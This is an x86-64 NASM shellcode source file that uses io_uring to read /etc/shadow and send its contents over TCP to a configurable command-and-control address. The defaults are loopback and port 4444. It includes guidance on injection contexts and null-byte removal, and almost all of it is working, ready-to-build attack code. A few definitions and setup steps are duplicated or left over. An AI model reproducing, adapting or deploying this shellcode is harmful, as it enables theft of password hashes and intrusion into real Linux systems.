; ================================================================
; shellcode.asm — io_uring exfil shellcode (combined)
; Mission: read /etc/shadow → send to C2 via io_uring
;
; Author : Maycon Vitali (@maycon) — github.com/maycon
; License: MIT — for authorized testing only
;
; Build  : nasm -f bin -o shellcode.bin shellcode.asm
; Verify : python3 extract.py shellcode.bin
;
; Null bytes: present in a few immediates (marked NULLBYTE).
;   These are encoding-level nulls that matter only for
;   null-terminated injection contexts (strcpy-style vulns).
;   For process injection via ptrace/hollowing: irrelevant.
;   To remove: wrap with XOR encoder or patch noted locations.
;
; Kernel: requires >= 5.5 for network ops via io_uring (>= 5.19 for
;         IORING_OP_SOCKET); >= 5.6 for RECV/SEND; >= 5.11 for IORING_OP_CLOSE
; Size  : ~937 bytes for the bundled exfil mission (see extract.py output);
;         missions build from this base via builder/uring_builder.py
; ================================================================

BITS 64

; ----------------------------------------------------------------
; Syscall numbers (x86_64)
; ----------------------------------------------------------------
%define SYS_MMAP      9
%define SYS_URING_STP 425
%define SYS_URING_ENT 426
%define SYS_EXIT      60

; ----------------------------------------------------------------
; io_uring / mmap constants
; ----------------------------------------------------------------
%define PROT_RW             3       ; PROT_READ | PROT_WRITE
                                    ; MAP_SHARED | MAP_POPULATE
%define MAP_SH_POP_LO       0x01    ; low byte
%define MAP_SH_POP_HI       0x80    ; high byte (MAP_POPULATE = 0x8000)
%define IORING_ENTER_GETEV  1

; io_uring_params field offsets (from start of params struct)
%define P_SQ_ENT    0               ; u32 sq_entries
%define P_CQ_ENT    4               ; u32 cq_entries
%define P_FEATURES  20              ; u32 features
%define P_SQ_HEAD   40              ; sq_off.head
%define P_SQ_TAIL   44              ; sq_off.tail
%define P_SQ_MASK   48              ; sq_off.ring_mask
%define P_SQ_ARRAY  64              ; sq_off.array
%define P_CQ_HEAD   80              ; cq_off.head
%define P_CQ_TAIL   84              ; cq_off.tail
%define P_CQ_MASK   88              ; cq_off.ring_mask
%define P_CQ_CQES   100             ; cq_off.cqes

%define IORING_FEAT_SINGLE_MMAP 1

; SQE opcodes
%define OP_OPENAT   18
%define OP_READ     22
%define OP_SOCKET   45
%define OP_CONNECT  16
%define OP_SEND     26

; SQE field offsets (within a 64-byte SQE)
%define SQ_OPCODE   0
%define SQ_FD       4
%define SQ_OFF      8
%define SQ_ADDR     16
%define SQ_LEN      24
%define SQ_OPFLAGS  28
%define SQ_UDATA    32      ; user_data at SQE+32 (0x20) — NOT +40 which is buf_index

; CQE field offsets
%define CQ_RES      8

; CQE field offsets
%define CQ_UDATA    0
%define CQ_RES      8

; Misc
%define AT_FDCWD    -100            ; 0xFFFFFF9C — no null bytes as s32

; ----------------------------------------------------------------
; Stack frame layout (r13 = frame base = rsp after allocation)
; ----------------------------------------------------------------
%define F_PARAMS    0       ; 104 bytes: io_uring_params (zeroed)
%define F_SQ_TP     104     ; 8: absolute pointer to sq ring tail word
%define F_CQ_HP     112     ; 8: absolute pointer to cq ring head word
%define F_CQ_TP     120     ; 8: absolute pointer to cq ring tail word
%define F_SQESB     128     ; 8: sqes mmap base
%define F_SQARR     136     ; 8: sq_array absolute pointer
%define F_CQESB     144     ; 8: cqes absolute pointer
%define F_SQMSK     152     ; 4: sq ring mask value
%define F_CQMSK     156     ; 4: cq ring mask value
%define F_URFD      160     ; 4: io_uring fd
%define F_FILEFD    164     ; 4: file fd (from openat)
%define F_SOCKFD    168     ; 4: socket fd
%define F_NBYTES    172     ; 4: bytes read
%define F_SADDR     176     ; 16: sockaddr_in (built at runtime)
%define F_RBUF      192     ; 4096: read buffer for /etc/shadow
%define F_ARGV      4288    ; 32: argv pointer array for execve (≤3 args + NULL)
%define F_TOTAL     4320    ; total frame = 4320 bytes

; ================================================================
; ENTRY POINT
; ================================================================
_start:
    ; Allocate stack frame
    sub rsp, F_TOTAL            ; NULLBYTE: 0x10D0 has null in encoding
    mov r13, rsp                ; r13 = stable frame pointer (preserved)

    ; Get runtime address of this shellcode (for data references)
    call _get_base
_get_base:
    pop r12                     ; r12 = current runtime address of _get_base
    ; data access: [r12 + (label - _get_base)]

    ; Zero the stack frame (F_TOTAL bytes = 540 qwords)
    ; 540 = 0x21C — imm16 has no zero bytes; NOTE: `add cl, imm8` style
    ;   arithmetic TRUNCATES the carry at byte width (0xFE+0x1E → 0x11C,
    ;   cl=0x1C, upper bits stale) leaving F_ARGV unzeroed — hence the
    ;   direct `mov cx, imm16`. And `xor ecx, ecx` is REQUIRED: without
    ;   it the upper 16 bits of ECX hold injected-context garbage and
    ;   rep stosq runs away over unmapped memory.
    mov rdi, r13
    xor eax, eax
    xor ecx, ecx
    mov cx, 540                 ; ecx = 540 (0x21C)
    rep stosq                   ; zero 540 qwords = 4320 bytes

; ================================================================
; LAYER 0 — Bootstrap: io_uring_setup + mmap
; ================================================================

    ; --- io_uring_setup(32, &params) ---
    xor eax, eax
    mov ax, 0x1A9               ; SYS_io_uring_setup = 425
    push 0x20
    pop rdi                     ; entries = 32
    lea rsi, [r13 + F_PARAMS]  ; &params on stack
    syscall
    test rax, rax
    js _fail
    mov [r13 + F_URFD], eax    ; save fd

    ; --- Compute SQ ring mmap size ---
    ; sq_ring_size = sq_off.array + sq_entries * 4
    mov ecx, [r13 + F_PARAMS + P_SQ_ENT]   ; ecx = sq_entries
    shl ecx, 2                               ; * 4
    add ecx, [r13 + F_PARAMS + P_SQ_ARRAY]  ; + sq_off.array
    ; ecx = sq_ring_size

    ; --- mmap SQ ring ---
    push SYS_MMAP
    pop rax
    xor rdi, rdi                ; addr = NULL
    mov esi, ecx             ; size = sq_ring_size
    push PROT_RW
    pop rdx                     ; prot = PROT_READ|PROT_WRITE
    xor r10, r10
    mov r10b, MAP_SH_POP_LO    ; r10 = 0x01 (MAP_SHARED)
    mov byte [rsp-1], MAP_SH_POP_HI  ; temp byte trick
    ; Simpler: build MAP_SHARED|MAP_POPULATE without null bytes
    ; MAP_SHARED=1, MAP_POPULATE=0x8000 → 0x8001
    xor r10, r10
    inc r10                     ; r10 = 1 (MAP_SHARED)
    mov eax, 1
    push 0xF                    ; 15
    pop rcx
    shl eax, cl                 ; eax = 0x8000 (MAP_POPULATE)
    or r10d, eax                ; r10d = 0x8001
    push SYS_MMAP
    pop rax
    movzx rsi, word [r13 + F_PARAMS + P_SQ_ENT]
    shl rsi, 2
    add esi, [r13 + F_PARAMS + P_SQ_ARRAY]   ; sq_ring_size
    xor rdi, rdi
    push PROT_RW
    pop rdx
    mov r8d, [r13 + F_URFD]    ; fd
    xor r9, r9                  ; offset = IORING_OFF_SQ_RING = 0
    syscall
    test rax, rax
    js _fail
    mov r14, rax                ; r14 = sq_ring_base

    ; --- Check SINGLE_MMAP feature: if set, CQ ring = same mmap ---
    mov ecx, [r13 + F_PARAMS + P_FEATURES]
    test ecx, IORING_FEAT_SINGLE_MMAP
    jnz .single_mmap

    ; --- mmap CQ ring (separate) ---
    ; cq_ring_size = cq_off.cqes + cq_entries * 16
    mov ecx, [r13 + F_PARAMS + P_CQ_ENT]
    shl ecx, 4                  ; * 16
    add ecx, [r13 + F_PARAMS + P_CQ_CQES]
    push SYS_MMAP
    pop rax
    xor rdi, rdi
    mov esi, ecx
    push PROT_RW
    pop rdx
    ; r10 already = 0x8001 (MAP_SHARED|MAP_POPULATE)
    mov r8d, [r13 + F_URFD]
    ; r9 = IORING_OFF_CQ_RING = 0x8000000 = 1<<27
    push 1
    pop r9
    push 0x1B                   ; 27
    pop rcx
    shl r9, cl
    syscall
    test rax, rax
    js _fail
    mov r15, rax                ; r15 = cq_ring_base
    jmp .do_sqes

.single_mmap:
    mov r15, r14                ; cq_ring_base = sq_ring_base

.do_sqes:
    ; --- mmap SQEs ---
    ; sqes_size = sq_entries * 64
    push SYS_MMAP
    pop rax
    xor rdi, rdi
    mov esi, [r13 + F_PARAMS + P_SQ_ENT]
    shl esi, 6                  ; * 64
    push PROT_RW
    pop rdx
    ; r10 = 0x8001 (recompute if clobbered)
    xor r10, r10
    inc r10
    mov eax, 1
    push 0xF
    pop rcx
    shl eax, cl
    or r10d, eax
    push SYS_MMAP
    pop rax
    mov esi, [r13 + F_PARAMS + P_SQ_ENT]
    shl esi, 6
    xor rdi, rdi
    push PROT_RW
    pop rdx
    mov r8d, [r13 + F_URFD]
    ; r9 = IORING_OFF_SQES = 0x10000000 = 1<<28
    push 1
    pop r9
    push 0x1C                   ; 28
    pop rcx
    shl r9, cl
    syscall
    test rax, rax
    js _fail
    mov [r13 + F_SQESB], rax   ; save SQEs base

    ; --- Compute and store internal pointers ---
    ; sq_tail pointer: sq_ring_base + sq_off.tail
    mov eax, [r13 + F_PARAMS + P_SQ_TAIL]
    add rax, r14
    mov [r13 + F_SQ_TP], rax

    ; sq ring mask value
    mov eax, [r13 + F_PARAMS + P_SQ_MASK]
    add rax, r14
    mov eax, [rax]              ; dereference to get actual mask value
    mov [r13 + F_SQMSK], eax

    ; sq_array pointer: sq_ring_base + sq_off.array
    mov eax, [r13 + F_PARAMS + P_SQ_ARRAY]
    add rax, r14
    mov [r13 + F_SQARR], rax

    ; cq_head pointer: cq_ring_base + cq_off.head
    mov eax, [r13 + F_PARAMS + P_CQ_HEAD]
    add rax, r15
    mov [r13 + F_CQ_HP], rax

    ; cq_tail pointer: cq_ring_base + cq_off.tail
    mov eax, [r13 + F_PARAMS + P_CQ_TAIL]
    add rax, r15
    mov [r13 + F_CQ_TP], rax

    ; cq ring mask value
    mov eax, [r13 + F_PARAMS + P_CQ_MASK]
    add rax, r15
    mov eax, [rax]
    mov [r13 + F_CQMSK], eax

    ; cqes pointer: cq_ring_base + cq_off.cqes
    mov eax, [r13 + F_PARAMS + P_CQ_CQES]
    add rax, r15
    mov [r13 + F_CQESB], rax

    ; Bootstrap complete — jump to mission
    jmp _mission

; ================================================================
; LAYER 1 — Runtime: SQE/CQE primitives
; ================================================================

; ----------------------------------------------------------------
; _get_sqe: allocate and zero next SQE slot
; Returns: rax = SQE pointer, r15d = slot index
; Clobbers: rcx, rdi, rdx
; ----------------------------------------------------------------
_get_sqe:
    ; index = *sq_tail & sq_mask
    mov rdx, [r13 + F_SQ_TP]
    mov r15d, [rdx]            ; current tail
    and r15d, [r13 + F_SQMSK] ; index = tail & mask

    ; sqe = sqes_base + index * 64
    mov rax, [r13 + F_SQESB]
    mov edx, r15d
    shl rdx, 6
    add rax, rdx               ; rax = &sqes[index]

    ; zero 64 bytes at rax
    push rax
    mov rdi, rax
    xor eax, eax
    push 8
    pop rcx
    rep stosq
    pop rax

    ; sq_array[index] = index
    mov rdx, [r13 + F_SQARR]
    mov [rdx + r15*4], r15d

    ; advance sq_tail
    mov rdx, [r13 + F_SQ_TP]
    inc dword [rdx]
    ret

; ----------------------------------------------------------------
; _io_enter: io_uring_enter(fd, 1, 1, GETEVENTS, 0, 0)
; Clobbers: rax, rdi, rsi, rdx, r10, r8, r9
; ----------------------------------------------------------------
_io_enter:
    xor eax, eax
    mov ax, 0x1AA              ; SYS_io_uring_enter = 426
    mov edi, [r13 + F_URFD]
    push 1
    pop rsi                    ; to_submit = 1
    push 1
    pop rdx                    ; min_complete = 1
    push 1
    pop r10                    ; IORING_ENTER_GETEVENTS
    xor r8, r8
    xor r9, r9
    syscall
    ret

; ----------------------------------------------------------------
; _wait_cqe: spin-poll until CQE available, consume it
; Returns: ecx = CQE.res (bytes or -errno)
; Clobbers: rax, rdx, r8
; ----------------------------------------------------------------
_wait_cqe:
.spin:
    mov rdx, [r13 + F_CQ_HP]
    mov r8d, [rdx]             ; head
    mov rdx, [r13 + F_CQ_TP]
    cmp r8d, [rdx]             ; head == tail → empty
    je .spin

    ; index = head & cq_mask
    and r8d, [r13 + F_CQMSK]

    ; cqe = cqes_base + index * 16
    mov rax, [r13 + F_CQESB]
    mov edx, r8d
    shl rdx, 4
    add rax, rdx

    ; read result
    mov ecx, [rax + CQ_RES]   ; ecx = CQE.res

    ; advance cq_head
    mov rdx, [r13 + F_CQ_HP]
    inc dword [rdx]
    ret

; ================================================================
; LAYER 2 — Mission: exfil_shadow
; ================================================================
_mission:

; ---- op 1: openat(AT_FDCWD, "/etc/shadow", O_RDONLY) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_OPENAT
    mov dword [rax + SQ_FD], AT_FDCWD   ; -100 → 0x9CFFFFFF (no nulls)
    lea rcx, [r12 + _path_shadow - _get_base]
    mov [rax + SQ_ADDR], rcx            ; path pointer
    ; SQ_OPFLAGS (+28) = O_RDONLY = 0 (zeroed by _get_sqe)
    mov qword [rax + SQ_UDATA], 1
    call _io_enter
    call _wait_cqe             ; ecx = file_fd or -errno
    test ecx, ecx
    js _fail
    mov [r13 + F_FILEFD], ecx

; ---- op 2: read(file_fd, buf, 4096) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_READ
    mov ecx, [r13 + F_FILEFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_RBUF]
    mov [rax + SQ_ADDR], rcx
    ; len = 4096 = 0x1000 — NULLBYTE in 32-bit encoding
    ; Build via shift: set byte [len+1] = 0x10 (len dword = 0x00001000)
    ; Actually: write as u16 at SQ_LEN: 0x1000 = 4096 fits in 16 bits
    mov word [rax + SQ_LEN], 0x1000    ; NULLBYTE: 0x1000 = 00 10
    ; For null-free: xor ecx,ecx; mov cl,0x10; shl ecx,8; mov [rax+SQ_LEN],ecx
    mov qword [rax + SQ_UDATA], 2
    call _io_enter
    call _wait_cqe             ; ecx = bytes_read or -errno
    test ecx, ecx
    js _fail
    mov [r13 + F_NBYTES], ecx

; ---- op 3: socket(AF_INET=2, SOCK_STREAM=1, proto=0) ----
; IORING_OP_SOCKET: fd=domain, off=type, len=protocol
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SOCKET
    mov dword [rax + SQ_FD], 2          ; AF_INET
    mov qword [rax + SQ_OFF], 1         ; SOCK_STREAM
    ; SQ_LEN = 0 (protocol, zeroed)
    mov qword [rax + SQ_UDATA], 3
    call _io_enter
    call _wait_cqe             ; ecx = sock_fd or -errno
    test ecx, ecx
    js _fail
    mov [r13 + F_SOCKFD], ecx

; ---- op 4: connect(sock_fd, &sockaddr_in, 16) ----
; Build sockaddr_in at stack frame F_SADDR:
;   +0  u16 sin_family = 2 (AF_INET)
;   +2  u16 sin_port   = _config_port (big-endian already)
;   +4  u32 sin_addr   = _config_ip   (big-endian already)
;   +8  u64 sin_zero   = 0 (frame already zeroed)
    lea rdx, [r13 + F_SADDR]
    mov word [rdx], 2                   ; AF_INET
    lea rcx, [r12 + _config_port - _get_base]
    movzx eax, word [rcx]
    mov [rdx + 2], ax                   ; sin_port
    lea rcx, [r12 + _config_ip - _get_base]
    mov eax, [rcx]
    mov [rdx + 4], eax                  ; sin_addr

    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_CONNECT
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_SADDR]
    mov [rax + SQ_ADDR], rcx
    ; CONNECT: addrlen goes in sqe->addr2 (SQ_OFF +8), NOT sqe->len (+24)
    ; Kernel io_connect_prep: if (sqe->len || ...) return -EINVAL
    push 0x10
    pop rcx
    mov [rax + SQ_OFF], rcx        ; addr2 = sizeof(sockaddr_in) = 16
    ; SQ_LEN stays 0 (zeroed by _get_sqe)
    mov qword [rax + SQ_UDATA], 4
    call _io_enter
    call _wait_cqe             ; ecx = 0 on success or -errno
    test ecx, ecx
    js _fail

; ---- op 5: send(sock_fd, buf, bytes_read, MSG_NOSIGNAL) ----
    call _get_sqe
    mov byte [rax + SQ_OPCODE], OP_SEND
    mov ecx, [r13 + F_SOCKFD]
    mov [rax + SQ_FD], ecx
    lea rcx, [r13 + F_RBUF]
    mov [rax + SQ_ADDR], rcx
    mov ecx, [r13 + F_NBYTES]
    mov [rax + SQ_LEN], ecx
    ; MSG_NOSIGNAL = 0x4000 at SQ_OPFLAGS (+28) — optional, avoid SIGPIPE
    mov dword [rax + SQ_OPFLAGS], 0x4000   ; NULLBYTE: 0x4000 has nulls
    mov qword [rax + SQ_UDATA], 5
    call _io_enter
    call _wait_cqe             ; ecx = bytes_sent or -errno

; ---- clean exit ----
    xor edi, edi
    push SYS_EXIT
    pop rax
    syscall

_fail:
    push 1
    pop rdi
    push SYS_EXIT
    pop rax
    syscall

; ================================================================
; Read-only data — accessed via r12 delta (r12 + label - _get_base)
; ================================================================
_path_shadow:
    db '/etc/shadow', 0

; ---- Patchable config (document these offsets via extract.py) ----
_config_ip:
    db 127, 0, 0, 1         ; default: 127.0.0.1 (loopback for testing)

_config_port:
    db 0x11, 0x5c           ; default: 4444 in network byte order